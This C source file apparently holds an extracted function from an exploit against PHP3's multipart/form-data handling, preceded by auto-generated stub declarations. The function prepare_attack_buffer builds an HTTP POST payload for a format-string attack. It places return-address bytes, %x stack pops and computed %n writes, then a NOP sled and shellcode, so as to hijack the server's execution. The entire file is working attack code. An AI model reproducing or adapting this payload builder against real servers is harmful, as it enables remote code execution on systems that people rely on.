#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct system_type {int shellcode_address; int shellcode_len; int /*<<< orphan*/  already_written; scalar_t__ offset; int /*<<< orphan*/  eip_address; } ;

/* Variables and functions */
 int BUF_LEN ; 
 int /*<<< orphan*/  NOP ; 
 scalar_t__ PHP3_WARNING ; 
 int /*<<< orphan*/  bzero (char*,int) ; 
 int calculate_precision (int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  memset (char*,int /*<<< orphan*/ ,int) ; 
 char* shellcode ; 
 int /*<<< orphan*/  sprintf (char*,char*,...) ; 
 int /*<<< orphan*/  strcat (char*,char*) ; 
 int strlen (char*) ; 
 int /*<<< orphan*/  strncat (char*,char*,int) ; 

void
prepare_attack_buffer (char *attack_buffer, struct system_type *system, 
								char *url)
{
	int	dest_buffer_written;		/* we keep track of how much bytes will be written in the destination buffer */
	int 	ctr;
	char	*address;
	char	buf[25];						// temp buffer for %xd%n%xd%n%xd%n%xd%n
											// where x is precision
	int 	p1,p2,p3,p4;
	int	nop_count;

	bzero (attack_buffer, 2000);
	sprintf (attack_buffer, "POST http://%s HTTP/1.0\nConnection: close\nUser-Agent: tirpitz\nContent-Type: multipart/form-data   ", url);
	// mark strlen here. whatever we write after here appears in the buffer
	dest_buffer_written = strlen (attack_buffer);

	strcat (attack_buffer, "\x11\x11\x11\x11");
	address = (char *)&system->eip_address;
	strncat (attack_buffer, address, 4);
	strcat (attack_buffer, "\x11\x11\x11\x11");
	system->eip_address++;
	address = (char *)&system->eip_address;
	strncat (attack_buffer, address, 4);
	strcat (attack_buffer, "\x11\x11\x11\x11");
	system->eip_address++;
	address = (char *)&system->eip_address;
	strncat (attack_buffer, address, 4);
	strcat (attack_buffer, "\x11\x11\x11\x11");
	system->eip_address++;
	address = (char *)&system->eip_address;
	strncat (attack_buffer, address, 4);

	/*
	 * we need to add %x corresponding to the number of pops we need to reach
	 * our embedded addresses we defined above
	 */
	for (; system->offset; system->offset--)
		strcat (attack_buffer, "%x ");

	p1 = calculate_precision ((system->shellcode_address & 0x000000ff), system->already_written);
	p2 = calculate_precision ((system->shellcode_address & 0x0000ff00) >> 8, system->already_written);
	p3 = calculate_precision ((system->shellcode_address & 0x00ff0000) >> 16, system->already_written);
	p4 = calculate_precision ((system->shellcode_address & 0xff000000) >> 24, system->already_written);
	sprintf (buf, "%%%dd%%n%%%dd%%n%%%dd%%n%%%dd%%n", p1, p2, p3, p4);
	strcat (attack_buffer, buf);

	ctr = strlen (attack_buffer); 
	dest_buffer_written = ctr - dest_buffer_written;
	dest_buffer_written += PHP3_WARNING; // dest_buffer_written now contains the number of bytes the PHP_WARNING and then the 8 4 byte values and then the %x to pop off the stack
	attack_buffer += ctr;
	nop_count = BUF_LEN - dest_buffer_written - system->shellcode_len;
	memset (attack_buffer, NOP, nop_count);
	/*
	 * Add our shellcode at last
	 */
	attack_buffer += nop_count;
	strcat (attack_buffer, shellcode);
	strcat (attack_buffer, "\n");
	strcat (attack_buffer, "Content-Length: 1337\n\n");
}